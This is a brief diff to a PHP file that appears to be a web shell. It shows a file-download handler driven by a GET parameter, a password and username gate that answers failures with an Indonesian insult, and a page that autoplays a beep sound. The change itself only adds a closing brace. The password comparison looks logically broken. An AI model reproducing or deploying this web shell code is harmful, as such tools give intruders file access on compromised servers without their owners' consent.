@@ -275,6 +275,7 @@ if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')
     exit;
 }
 } if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['username']) && !empty($_POST['username']) ){ $pass = $_POST['pass']; $user = $_POST['username']; if($pass > 50){ die("<center><b><font color='red'>Password yang Anda masukkan salah Goblok..!".$warn."</font></b></center> ");
+}
 ?>
 <html>
 	<audio autoplay> <source src="https://archive.org/download/BeepsShort/Beeps%20Short.wav" type="audio/mpeg"></audio>
